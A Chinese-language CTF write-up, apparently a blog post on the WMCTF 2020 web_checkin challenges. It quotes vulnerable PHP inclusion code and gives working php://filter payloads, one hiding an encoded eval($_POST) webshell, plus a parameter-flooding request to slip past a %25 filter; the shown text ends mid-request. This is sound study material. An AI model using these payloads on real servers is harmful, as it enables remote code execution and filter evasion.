<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-wmctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/wmctf2020/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T11:06:19.635Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/wmctf2020/">wmctf2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="wmctf-2020"><a href="#wmctf-2020" class="headerlink" title="wmctf 2020"></a>wmctf 2020</h1><p>u1s1，这次比赛质量很高</p>
<h2 id="web-checkin"><a href="#web-checkin" class="headerlink" title="web_checkin"></a>web_checkin</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//PHP 7.0.33 Apache/2.4.25</span><br><span class="line">error_reporting(0);</span><br><span class="line">$sandbox = &#x27;/var/www/html/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;content&#x27;])) &#123;</span><br><span class="line">    $content = $_GET[&#x27;content&#x27;];</span><br><span class="line">    if(preg_match(&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;,$content))</span><br><span class="line">         die(&#x27;hacker&#x27;);</span><br><span class="line">    if(file_exists($content))</span><br><span class="line">        require_once($content);</span><br><span class="line">    file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这题就很简单，因为flag就在/flag，直接包含拿到flag</p>
<h2 id="web-checkin2"><a href="#web-checkin2" class="headerlink" title="web_checkin2"></a>web_checkin2</h2><p>这题就很有意思了，搞了整整一天</p>
<p>一样的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>]);</span><br><span class="line">@mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">@chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="variable">$content</span>))</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$content</span>))</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="variable">$content</span>);</span><br><span class="line">    file_put_contents(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这次flag不在/flag，所以我们需要命令执行</p>
<p>因为这个php版本是7.0.33所以<code>string.strip_tags</code>这个过滤器不能用，不然的话可以利用这样的payload:<code>php://filter/write=string.strip_tags|dechunk/resource=%3f&gt;%31%0a%3c%0a%32%36%0a%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%65%78%69%74%3b</code></p>
<p>为啥不能用嘞，因为7.0.33版本有个bug，用<code>string.strip_tags</code>会出现segment fault</p>
<p>后来我就想到了，利用segment fault，php不会删除临时文件，所以就上传文件，然后爆破文件名，但是后来题目弄了个提醒：<code>no brute force</code> 心态裂开</p>
<p>于是我们得找其他的方法，</p>
<p>这下彻底没招了，只能去看源代码了，在分析代码的时候发现：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200802191228.png" alt="image1550"></p>
<p>php会对filter进行urldecode，美滋滋那么payload出来了</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565|%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533|%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565/resource=1%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%07b8%9C%A0%FB%0An</span><br></pre></td></tr></table></figure>

<p>但是新的问题出现了，这个网站的中间件会ban<code>%25</code>，送出题人一句mmp。</p>
<p>跨过千山万水来到这里，结果还有新的拦路虎。</p>
<p>一般遇到服务器中间件拦截%25的时候，我们可以试试php与中间件对数据解析的差异来绕过，或者试试http请求走私，测试后发现两种都不行</p>
<p>服务器过滤了%25，测试下发现这是是针对参数值的，如把%25放到参数名那里就是很ok的，然后我们就知道他是针对参数检测的，如果参数过多它还能检测吗</p>
<p>于是有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php/aaa/?a=&amp;b=&amp;c=&amp;d=&amp;e=&amp;f=&amp;g=&amp;h=&amp;i=&amp;j=&amp;k=&amp;l=&amp;m=&amp;n=&amp;o=&amp;p=&amp;q=&amp;r=&amp;s=&amp;t=&amp;u=&amp;v=&amp;w=&amp;x=&amp;y=&amp;z=&amp;A=&amp;B=&amp;C=&amp;D=&amp;E=&amp;F=&amp;G=&amp;H=&amp;I=&amp;J=&amp;K=&amp;L=&amp;M=&amp;N=&amp;O=&amp;P=&amp;Q=&amp;R=&amp;S=&amp;T=&amp;U=&amp;V=&amp;W=&amp;X=&amp;Y=&amp;Z=&amp;0=&amp;1=&amp;2=&amp;3=&amp;4=&amp;5=&amp;6=&amp;7=&amp;8=&amp;9=&amp;aa=&amp;ab=&amp;ac=&amp;ad=&amp;ae=&amp;af=&amp;ag=&amp;ah=&amp;ai=&amp;aj=&amp;ak=&amp;al=&amp;am=&amp;an=&amp;ao=&amp;ap=&amp;aq=&amp;ar=&amp;as=&amp;at=&amp;au=&amp;av=&amp;aw=&amp;ax=&amp;ay=&amp;az=&amp;aA=&amp;aB=&amp;aC=&amp;aD=&amp;aE=&amp;aF=&amp;aG=&amp;aH=&amp;aI=&amp;aJ=&amp;aK=&amp;aL=&amp;aM=&amp;aN=&amp;aO=&amp;aP=&amp;aQ=&amp;aR=&amp;aS=&amp;aT=&amp;aU=&amp;aV=&amp;aW=&amp;aX=&amp;aY=&amp;aZ=&amp;a0=&amp;a1=&amp;a2=&amp;a3=&amp;a4=&amp;a5=&amp;a6=&amp;a7=&amp;a8=&amp;a9=&amp;ba=&amp;bb=&amp;bc=&amp;bd=&amp;be=&amp;bf=&amp;bg=&amp;bh=&amp;bi=&amp;bj=&amp;bk=&amp;bl=&amp;bm=&amp;bn=&amp;bo=&amp;bp=&amp;bq=&amp;br=&amp;bs=&amp;bt=&amp;bu=&amp;bv=&amp;bw=&amp;bx=&amp;by=&amp;bz=&amp;bA=&amp;bB=&amp;bC=&amp;bD=&amp;bE=&amp;bF=&amp;bG=&amp;bH=&amp;bI=&amp;bJ=&amp;bK=&amp;bL=&amp;bM=&amp;bN=&amp;bO=&amp;bP=&amp;bQ=&amp;bR=&amp;bS=&amp;bT=&amp;bU=&amp;bV=&amp;bW=&amp;bX=&amp;bY=&amp;bZ=&amp;b0=&amp;b1=&amp;b2=&amp;b3=&amp;b4=&amp;b5=&amp;b6=&amp;b7=&amp;b8=&amp;b9=&amp;ca=&amp;cb=&amp;cc=&amp;cd=&amp;ce=&amp;cf=&amp;cg=&amp;ch=&amp;ci=&amp;cj=&amp;ck=&amp;cl=&amp;cm=&amp;cn=&amp;co=&amp;cp=&amp;cq=&amp;cr=&amp;cs=&amp;ct=&amp;cu=&amp;cv=&amp;cw=&amp;cx=&amp;cy=&amp;cz=&amp;cA=&amp;cB=&amp;cC=&amp;cD=&amp;cE=&amp;cF=&amp;cG=&amp;cH=&amp;cI=&amp;content=php://filter/write=%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2565%256e%2563%256f%2564%2565|%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533|%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565/resource=1%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%07b8%9C%A0%FB%0An&amp;cJ=&amp;cK=&amp;cL=&amp;cM=&amp;cN=&amp;cO=&amp;cP=&amp;cQ=&amp;cR=&amp;cS=&amp;cT=&amp;cU=&amp;cV=&amp;cW=&amp;cX=&amp;cY=&amp;cZ=&amp;c0=&amp;c1=&amp;c2=&amp;c3=&amp;c4=&amp;c5=&amp;c6=&amp;c7=&amp;c8=&amp;c9=&amp;da=&amp;db=&amp;dc=&amp;dd=&amp;de=&amp;df=&amp;dg=&amp;dh=&amp;di=&amp;dj=&amp;dk=&amp;dl=&amp;dm=&amp;dn=&amp;do=&amp;dp=&amp;dq=&amp;dr=&amp;ds=&amp;dt=&amp;du=&amp;dv=&amp;dw=&amp;dx=&amp;dy=&amp;dz=&amp;dA=&amp;dB=&amp;dC=&amp;dD=&amp;dE=&amp;dF=&amp;dG=&amp;dH=&amp;dI=&amp;dJ=&amp;dK=&amp;dL=&amp;dM=&amp;dN=&amp;dO=&amp;dP=&amp;dQ=&amp;dR=&amp;dS=&amp;dT=&amp;dU=&amp;dV=&amp;dW=&amp;dX=&amp;dY=&amp;dZ=&amp;d0=&amp;d1=&amp;d2=&amp;d3=&amp;d4=&amp;d5=&amp;d6=&amp;d7=&amp;d8=&amp;d9=&amp;ea=&amp;eb=&amp;ec=&amp;ed=&amp;ee=&amp;ef=&amp;eg=&amp;eh=&amp;ei=&amp;ej=&amp;ek=&amp;el=&amp;em=&amp;en=&amp;eo=&amp;ep=&amp;eq=&amp;er=&amp;es=&amp;et=&amp;eu=&amp;ev=&amp;ew=&amp;ex=&amp;ey=&amp;ez=&amp;eA=&amp;eB=&amp;eC=&amp;eD=&amp;eE=&amp;eF=&amp;eG=&amp;eH=&amp;eI=&amp;eJ=&amp;eK=&amp;eL=&amp;eM=&amp;eN=&amp;eO=&amp;eP=&amp;eQ=&amp;eR=&amp;eS=&amp;eT=&amp;eU=&amp;eV=&amp;eW=&amp;eX=&amp;eY=&amp;eZ=&amp;e0=&amp;e1=&amp;e2=&amp;e3=&amp;e4=&amp;e5=&amp;e6=&amp;e7=&amp;e8=&amp;e9=&amp;fa=&amp;fb=&amp;fc=&amp;fd=&amp;fe=&amp;ff=&amp;fg=&amp;fh=&amp;fi=&amp;fj=&amp;fk=&amp;fl=&amp;fm=&amp;fn=&amp;fo=&amp;fp=&amp;fq=&amp;fr=&amp;fs=&amp;ft=&amp;fu=&amp;fv=&amp;fw=&amp;fx=&amp;fy=&amp;fz=&amp;fA=&amp;fB=&amp;fC=&amp;fD=&amp;fE=&amp;fF=&amp;fG=&amp;fH=&amp;fI=&amp;fJ=&amp;fK=&amp;fL=&amp;fM=&amp;fN=&amp;fO=&amp;fP=&amp;fQ=&amp;fR=&amp;fS=&amp;fT=&amp;fU=&amp;fV=&amp;fW=&amp;fX=&amp;fY=&amp;fZ=&amp;f0=&amp;f1=&amp;f2=&amp;f3=&amp;f4=&amp;f5=&amp;f6=&amp;f7=&amp;f8=&amp;f9=&amp;ga=&amp;gb=&amp;gc=&amp;gd=&amp;ge=&amp;gf=&amp;gg=&amp;gh=&amp;gi=&amp;gj=&amp;gk=&amp;gl=&amp;gm=&amp;gn=&amp;go=&amp;gp=&amp;gq=&amp;gr=&amp;gs=&amp;gt=&amp;gu=&amp;gv=&amp;gw=&amp;gx=&amp;gy=&amp;gz=&amp;gA=&amp;gB=&amp;gC=&amp;gD=&amp;gE=&amp;gF=&amp;gG=&amp;gH=&amp;gI=&amp;gJ=&amp;gK=&amp;gL=&amp;gM=&amp;gN=&amp;gO=&amp;gP=&amp;gQ=&amp;gR=&amp;gS=&amp;gT=&amp;gU=&amp;gV=&amp;gW=&amp;gX=&amp;gY=&amp;gZ=&amp;g0=&amp;g1=&amp;g2=&amp;g3=&amp;g4=&amp;g5=&amp;g6=&amp;g7=&amp;g8=&amp;g9=&amp;ha=&amp;hb=&amp;hc=&amp;hd=&amp;he=&amp;hf=&amp;hg=&amp;hh=&amp;hi=&amp;hj=&amp;hk=&amp;hl=&amp;hm=&amp;hn=&amp;ho=&amp;hp=&amp;hq=&amp;hr=&amp;hs=&amp;ht=&amp;hu=&amp;hv=&amp;hw=&amp;hx=&amp;hy=&amp;hz=&amp;hA=&amp;hB=&amp;hC=&amp;hD=&amp;hE=&amp;hF=&amp;hG=&amp;hH=&amp;hI=&amp;hJ=&amp;hK=&amp;hL=&amp;hM=&amp;hN=&amp;hO=&amp;hP=&amp;hQ=&amp;hR=&amp;hS=&amp;hT=&amp;hU=&amp;hV=&amp;hW=&amp;hX=&amp;hY=&amp;hZ=&amp;h0=&amp;h1=&amp;h2=&amp;h3=&amp;h4=&amp;h5=&amp;h6=&amp;h7=&amp;h8=&amp;h9=&amp;ia=&amp;ib=&amp;ic=&amp;id=&amp;ie=&amp;if=&amp;ig=&amp;ih=&amp;ii=&amp;ij=&amp;ik=&amp;il=&amp;im=&amp;in=&amp;io=&amp;ip=&amp;iq=&amp;ir=&amp;is=&amp;it=&amp;iu=&amp;iv=&amp;iw=&amp;ix=&amp;iy=&amp;iz=&amp;iA=&amp;iB=&amp;iC=&amp;iD=&amp;iE=&amp;iF=&amp;iG=&amp;iH=&amp;iI=&amp;iJ=&amp;iK=&amp;iL=&amp;iM=&amp;iN=&amp;iO=&amp;iP=&amp;iQ=&amp;iR=&amp;iS=&amp;iT=&amp;iU=&amp;iV=&amp;iW=&amp;iX=&amp;iY=&amp;iZ=&amp;i0=&amp;i1=&amp;i2=&amp;i3=&amp;i4=&amp;i5=&amp;i6=&amp;i7=&amp;i8=&amp;i9=&amp;ja=&amp;jb=&amp;jc=&amp;jd=&amp;je=&amp;jf=&amp;jg=&amp;jh=&amp;ji=&amp;jj=&amp;jk=&amp;jl=&amp;jm=&amp;jn=&amp;jo=&amp;jp=&amp;jq=&amp;jr=&amp;js=&amp;jt=&amp;ju=&amp;jv=&amp;jw=&amp;jx=&amp;jy=&amp;jz=&amp;jA=&amp;jB=&amp;jC=&amp;jD=&amp;jE=&amp;jF=&amp;jG=&amp;jH=&amp;jI=&amp;jJ=&amp;jK=&amp;jL=&amp;jM=&amp;jN=&amp;jO=&amp;jP=&amp;jQ=&amp;jR=&amp;jS=&amp;jT=&amp;jU=&amp;jV=&amp;jW=&amp;jX=&amp;jY=&amp;jZ=&amp;j0=&amp;j1=&amp;j2=&amp;j3=&amp;j4=&amp;j5=&amp;j6=&amp;j7=&amp;j8=&amp;j9=&amp;ka=&amp;kb=&amp;kc=&amp;kd=&amp;ke=&amp;kf=&amp;kg=&amp;kh=&amp;ki=&amp;kj=&amp;kk=&amp;kl=&amp;km=&amp;kn=&amp;ko=&amp;kp=&amp;kq=&amp;kr=&amp;ks=&amp;kt=&amp;ku=&amp;kv=&amp;kw=&amp;kx=&amp;ky=&amp;kz=&amp;kA=&amp;kB=&amp;kC=&amp;kD=&amp;kE=&amp;kF=&amp;kG=&amp;kH=&amp;kI=&amp;kJ=&amp;kK=&amp;kL=&amp;kM=&amp;kN=&amp;kO=&amp;kP=&amp;kQ=&amp;kR=&amp;kS=&amp;kT=&amp;kU=&amp;kV=&amp;kW=&amp;kX=&amp;kY=&amp;kZ=&amp;k0=&amp;k1=&amp;k2=&amp;k3=&amp;k4=&amp;k5=&amp;k6=&amp;k7=&amp;k8=&amp;k9=&amp;la=&amp;lb=&amp;lc=&amp;ld=&amp;le=&amp;lf=&amp;lg=&amp;lh=&amp;li=&amp;lj=&amp;lk=&amp;ll=&amp;lm=&amp;ln=&amp;lo=&amp;lp=&amp;lq=&amp;lr=&amp;ls=&amp;lt=&amp;lu=&amp;lv=&amp;lw=&amp;lx=&amp;ly=&amp;lz=&amp;lA=&amp;lB=&amp;lC=&amp;lD=&amp;lE=&amp;lF=&amp;lG=&amp;lH=&amp;lI=&amp;lJ=&amp;lK=&amp;lL=&amp;lM=&amp;lN=&amp;lO=&amp;lP=&amp;lQ=&amp;lR=&amp;lS=&amp;lT=&amp;lU=&amp;lV=&amp;lW=&amp;lX=&amp;lY=&amp;lZ=&amp;l0=&amp;l1=&amp;l2=&amp;l3=&amp;l4=&amp;l5=&amp;l6=&amp;l7=&amp;l8=&amp;l9=&amp;ma=&amp;mb=&amp;mc=&amp;md=&amp;me=&amp;mf=&amp;mg=&amp;mh=&amp;mi=&amp;mj=&amp;mk=&amp;ml=&amp;mm=&amp;mn=&amp;mo=&amp;mp=&amp;mq=&amp;mr=&amp;ms=&amp;mt=&amp;mu=&amp;mv=&amp;mw=&amp;mx=&amp;my=&amp;mz=&amp;mA=&amp;mB=&amp;mC=&amp;mD=&amp;mE=&amp;mF=&amp;mG=&amp;mH=&amp;mI=&amp;mJ=&amp;mK=&amp;mL=&amp;mM=&amp;mN=&amp;mO=&amp;mP=&amp;mQ=&amp;mR=&amp;mS=&amp;mT=&amp;mU=&amp;mV=&amp;mW=&amp;mX=&amp;mY=&amp;mZ=&amp;m0=&amp;m1=&amp;m2=&amp;m3=&amp;m4=&amp;m5=&amp;m6=&amp;m7=&amp;m8=&amp;m9=&amp;na=&amp;nb=&amp;nc=&amp;nd=&amp;ne=&amp;nf=&amp;ng=&amp;nh=&amp;ni=&amp;nj=&amp;nk=&amp;nl=&amp;nm=&amp;nn=&amp;no=&amp;np=&amp;nq=&amp;nr=&amp;ns=&amp;nt=&amp;nu=&amp;nv=&amp;nw=&amp;nx=&amp;ny=&amp;nz=&amp;nA=&amp;nB=&amp;nC=&amp;nD=&amp;nE=&amp;nF=&amp;nG=&amp;nH=&amp;nI=&amp;nJ=&amp;nK=&amp;nL=&amp;nM=&amp;nN=&amp;nO=&amp;nP=&amp;nQ=&amp;nR=&amp;nS=&amp;nT=&amp;nU=&amp;nV=&amp;nW=&amp;nX=&amp;nY=&amp;nZ=&amp;n0=&amp;n1=&amp;n2=&amp;n3=&amp;n4=&amp;n5=&amp;n6=&amp;n7=&amp;n8=&amp;n9=&amp;oa=&amp;ob=&amp;oc=&amp;od=&amp;oe=&amp;of=&amp;og=&amp;oh=&amp;oi=&amp;oj=&amp;ok=&amp;ol=&amp;om=&amp;on=&amp;oo=&amp;op=&amp;oq=&amp;or=&amp;os=&amp;ot=&amp;ou=&amp;ov=&amp;ow=&amp;ox=&amp;oy=&amp;oz=&amp;oA=&amp;oB=&amp;oC=&amp;oD=&amp;oE=&amp;oF=&amp;oG=&amp;oH=&amp;oI=&amp;oJ=&amp;oK=&amp;oL=&amp;oM=&amp;oN=&amp;oO=&amp;oP=&amp;oQ=&amp;oR=&amp;oS=&amp;oT=&amp;oU=&amp;oV=&amp;oW=&amp;oX=&amp;oY=&amp;oZ=&amp;o0=&amp;o1=&amp;o2=&amp;o3=&amp;o4=&amp;o5=&amp;o6=&amp;o7=&amp;o8=&amp;o9=&amp;pa=&amp;pb=&amp;pc=&amp;pd=&amp;pe=&amp;pf=&amp;pg=&amp;ph=&amp;pi=&amp;pj=&amp;pk=&amp;pl=&amp;pm=&amp;pn=&amp;po=&amp;pp=&amp;pq=&amp;pr=&amp;ps=&amp;pt=&amp;pu=&amp;pv=&amp;pw=&amp;px=&amp;py=&amp;pz=&amp;pA=&amp;pB=&amp;pC=&amp;pD=&amp;pE=&amp;pF=&amp;pG=&amp;pH=&amp;pI=&amp;pJ=&amp;pK=&amp;pL=&amp;pM=&amp;pN=&amp;pO=&amp;pP=&amp;pQ=&amp;pR=&amp;pS=&amp;pT=&amp;pU=&amp;pV=&amp;pW=&amp;pX=&amp;pY=&amp;pZ=&amp;p0=&amp;p1=&amp;p2=&amp;p3=&amp;p4=&amp;p5=&amp;p6=&amp;p7=&amp;p8=&amp;p9=&amp;qa=&amp;qb=&amp;qc=&amp;qd=&amp;qe=&amp;qf=&amp;qg=&amp;qh=&amp;qi=&amp;qj=&amp;qk=&amp;ql=&amp;qm=&amp;qn=&amp;qo=&amp;qp=&amp;qq=&amp;qr=&amp;qs=&amp;qt=&amp;qu=&amp;qv=&amp;qw=&amp;qx=&amp;qy=&amp;qz=&amp;qA=&amp;qB=&amp;qC=&amp;qD=&amp;qE=&amp;qF=&amp;qG=&amp;qH=&amp;qI=&amp;qJ=&amp;qK=&amp;qL=&amp;qM=&amp;qN=&amp;qO=&amp;qP=&amp;qQ=&amp;qR=&amp;qS=&amp;qT=&amp;qU=&amp;qV=&amp;qW=&amp;qX=&amp;qY=&amp;qZ=&amp;q0=&amp;q1=&amp;q2=&amp;q3=&amp;q4=&amp;q5=&amp;q6=&amp;q7=&amp;q8=&amp;q9=&amp;ra=&amp;rb=&amp;rc=&amp;rd=&amp;re=&amp;rf=&amp;rg=&amp;rh=&amp;ri=&amp;rj=&amp;rk=&amp;rl=&amp;rm=&amp;rn=&amp;ro=&amp;rp=&amp;rq=&amp;rr=&amp;rs=&amp;rt=&amp;ru=&amp;rv=&amp;rw=&amp;rx=&amp;ry=&amp;rz=&amp;rA=&amp;rB=&amp;rC=&amp;rD=&amp;rE=&amp;rF=&amp;rG=&amp;rH=&amp;rI=&amp;rJ=&amp;rK=&amp;rL=&amp;rM=&amp;rN=&amp;rO=&amp;rP=&amp;rQ=&amp;rR=&amp;rS=&amp;rT=&amp;rU=&amp;rV=&amp;rW=&amp;rX=&amp;rY=&amp;rZ=&amp;r0=&amp;r1=&amp;r2=&amp;r3=&amp;r4=&amp;r5=&amp;r6=&amp;r7=&amp;r8=&amp;r9=&amp;sa=&amp;sb=&amp;sc=&amp;sd=&amp;se=&amp;sf=&amp;sg=&amp;sh=&amp;si=&amp;sj=&amp;sk=&amp;sl=&amp;sm=&amp;sn=&amp;so=&amp;sp=&amp;sq=&amp;sr=&amp;ss=&amp;st=&amp;su=&amp;sv=&amp;sw=&amp;sx=&amp;sy=&amp;sz=&amp;sA=&amp;sB=&amp;sC=&amp;sD=&amp;sE=&amp;sF=&amp;sG=&amp;sH=&amp;sI=&amp;sJ=&amp;sK=&amp;sL=&amp;sM=&amp;sN=&amp;sO=&amp;sP=&amp;sQ=&amp;sR=&amp;sS=&amp;sT=&amp;sU=&amp;sV=&amp;sW=&amp;sX=&amp;sY=&amp;sZ=&amp;s0=&amp;s1=&amp;s2=&amp;s3=&amp;s4=&amp;s5=&amp;s6=&amp;s7=&amp;s8=&amp;s9=&amp;ta=&amp;tb=&amp;tc=&amp;td=&amp;te=&amp;tf=&amp;tg=&amp;th=&amp;ti=&amp;tj=&amp;tk=&amp;tl=&amp;tm=&amp;tn=&amp;to=&amp;tp=&amp;tq=&amp;tr=&amp;ts=&amp;tt=&amp;tu=&amp;tv=&amp;tw=&amp;tx=&amp;ty=&amp;tz=&amp;tA=&amp;tB=&amp;tC=&amp;tD=&amp;tE=&amp;tF=&amp;tG=&amp;tH=&amp;tI=&amp;tJ=&amp;tK=&amp;tL=&amp;tM=&amp;tN=&amp;tO=&amp;tP=&amp;tQ=&amp;tR=&amp;tS=&amp;tT=&amp;tU=&amp;tV=&amp;tW=&amp;tX=&amp;tY=&amp;tZ=&amp;t0=&amp;t1=&amp;t2=&amp;t3=&amp;t4=&amp;t5=&amp;t6=&amp;t7=&amp;t8=&amp;t9=&amp;ua=&amp;ub=&amp;uc=&amp;ud=&amp;ue=&amp;uf=&amp;ug=&amp;uh=&amp;ui=&amp;uj=&amp;uk=&amp;ul=&amp;um=&amp;un=&amp;uo=&amp;up=&amp;uq=&amp;ur=&amp;us=&amp;ut=&amp;uu=&amp;uv=&amp;uw=&amp;ux=&amp;uy=&amp;uz=&amp;uA=&amp;uB=&amp;uC=&amp;uD=&amp;uE=&amp;uF=&amp;uG=&amp;uH=&amp;uI=&amp;uJ=&amp;uK=&amp;uL=&amp;uM=&amp;uN=&amp;uO=&amp;uP=&amp;uQ=&amp;uR=&amp;uS=&amp;uT=&amp;uU=&amp;uV=&amp;uW=&amp;uX=&amp;uY=&amp;uZ=&amp;u0=&amp;u1=&amp;u2=&amp;u3=&amp;u4=&amp;u5=&amp;u6=&amp;u7=&amp;u8=&amp;u9=&amp;va=&amp;vb=&amp;vc=&amp;vd=&amp;ve=&amp;vf=&amp;vg=&amp;vh=&amp;vi=&amp;vj=&amp;vk=&amp;vl=&amp;vm=&amp;vn=&amp;vo=&amp;vp=&amp;vq=&amp;vr=&amp;vs=&amp;vt=&amp;vu=&amp;vv=&amp;vw=&amp;vx=&amp;vy=&amp;vz=&amp;vA=&amp;vB=&amp;vC=&amp;vD=&amp;vE=&amp;vF=&amp;vG=&amp;vH=&amp;vI=&amp;vJ=&amp;vK=&amp;vL=&amp;vM=&amp;vN=&amp;vO=&amp;vP=&amp;vQ=&amp;vR=&amp;vS=&amp;vT=&amp;vU=&amp;vV=&amp;vW=&amp;vX=&amp;vY=&amp;vZ=&amp;v0=&amp;v1=&amp;v2=&amp;v3=&amp;v4=&amp;v5=&amp;v6=&amp;v7=&amp;v8=&amp;v9=&amp;wa=&amp;wb=&amp;wc=&amp;wd=&amp;we=&amp;wf=&amp;wg=&amp;wh=&amp;wi=&amp;wj=&amp;wk=&amp;wl=&amp;wm=&amp;wn=&amp;wo=&amp;wp=&amp;wq=&amp;wr=&amp;ws=&amp;wt=&amp;wu=&amp;wv=&amp;ww=&amp;wx=&amp;wy=&amp;wz=&amp;wA=&amp;wB=&amp;wC=&amp;wD=&amp;wE=&amp;wF=&amp;wG=&amp;wH=&amp;wI=&amp;wJ=&amp;wK=&amp;wL=&amp;wM=&amp;wN=&amp;wO=&amp;wP=&amp;wQ=&amp;wR=&amp;wS=&amp;wT=&amp;wU=&amp;wV=&amp;wW=&amp;wX=&amp;wY=&amp;wZ=&amp;w0=&amp;w1=&amp;w2=&amp;w3=&amp;w4=&amp;w5=&amp;w6=&amp;w7=&amp;w8=&amp;w9=&amp;xa=&amp;xb=&amp;xc=&amp;xd=&amp;xe=&amp;xf=&amp;xg=&amp;xh=&amp;xi=&amp;xj=&amp;xk=&amp;xl=&amp;xm=